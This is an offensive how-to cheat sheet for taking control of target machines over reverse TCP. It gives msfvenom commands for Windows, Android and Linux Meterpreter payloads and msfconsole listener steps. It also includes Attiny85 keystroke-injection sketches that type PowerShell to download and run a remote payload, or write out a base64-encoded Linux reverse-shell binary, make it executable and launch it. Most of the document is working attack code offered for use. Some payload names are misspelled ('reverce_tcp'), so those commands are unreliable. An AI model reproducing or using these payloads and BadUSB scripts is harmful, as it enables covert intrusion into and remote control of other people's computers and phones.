# Connect to target Using Reverce-tcp

## windows/android
create payload
```
msfvenom -p windows/meterpreter/reverce_tcp --platform windows -a x86 -f exe LHOST=<youtIP> LPORT=444 -o <PayloadPath>
msfvenom -p android/meterpreter/reverce_tcp --platform android LHOST=<youtIP> LPORT=444 -o <PayloadPath>
```
connect to target
```
msfconsole
use multi/handler
set payload <windows>/<android>/meterpreter/reverce_tcp
set LHOST <>
set LPORT <>
exploit
```
## windows/linux Attiny85
create payload windows
```
msfvenom -p windows/meterpreter/reverce_tcp --platform windows -f vbs --smallest LHOST=<youtIP> LPORT=444 -o <PayloadPath.txt>
OR
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f psh-cmd
```
create payload linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<youtIP> LPORT=880 -f elf > mShell_880
base64 mShell_880 > mShell_880.b64
```
make Attiny85 ready for windows
```
#include "DigiKeyboard.h"


void setup() {
  // Adding some LED-effects just for fun ;)
  pinMode(1, OUTPUT);

  delay(100);
  // WIN+r, delete content, start powershell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // WIN+r
  delay(100);
  DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean it up
  delay(50);
  DigiKeyboard.println("powershell");
  delay(500);

  // turn the LED on
  digitalWrite(1, HIGH);
  // $url = '...' --> URL to Payload
  DigiKeyboard.println("$url = 'https://xxx/payload.html'");
  delay(50);

  // $result = Invoke-WebRequest -Uri $url
  DigiKeyboard.println("$result = Invoke-WebRequest -Uri $url");
  delay(50);

  // powershell.exe -nop -e $result.content
  DigiKeyboard.println("powershell.exe -nop -e $result.content");

  // turn off the led if the payload is places and executed
  digitalWrite(1, LOW);

  delay(1500);
  DigiKeyboard.println("exit");
}

void loop() {
  // if done with the scripts LED starts blinking

  digitalWrite(1, HIGH);
  delay(150);

  digitalWrite(1, LOW);
  delay(500);

}
```
make Attiny85 ready for linux
```
#include "DigiKeyboard.h"

void setup() {

// LED on.
pinMode(1, OUTPUT);
delay(200);
// Super, delete content
// Start to inject payload, turn the LED on
digitalWrite(1, HIGH);
DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean
delay(200);

DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); // Super key, open 'search'
delay(300);

DigiKeyboard.print("terminal"); // Program to run
delay(500);

DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
// Delay for 1 second, if terminal is not opened, part of the string below is wasted to /dev/null
delay(1000);

// Send our payload
DigiKeyboard.print("echo");
DigiKeyboard.sendKeyStroke(KEY_SPACE);
DigiKeyboard.print("f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1toCgAACGgCAANwieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E= | base64 --decode &gt; /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);

// Change the permissions for the file...
DigiKeyboard.println("chmod 755 /tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(200);
// ...and execute it
DigiKeyboard.println("/tmp/mShell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);

delay(100);
// Payload executed!
digitalWrite(1, LOW);

}

void loop() {
// When scripts are done, blink some LED like it's 19

digitalWrite(1, HIGH);
delay(200);

digitalWrite(1, LOW);
delay(300);

}
```
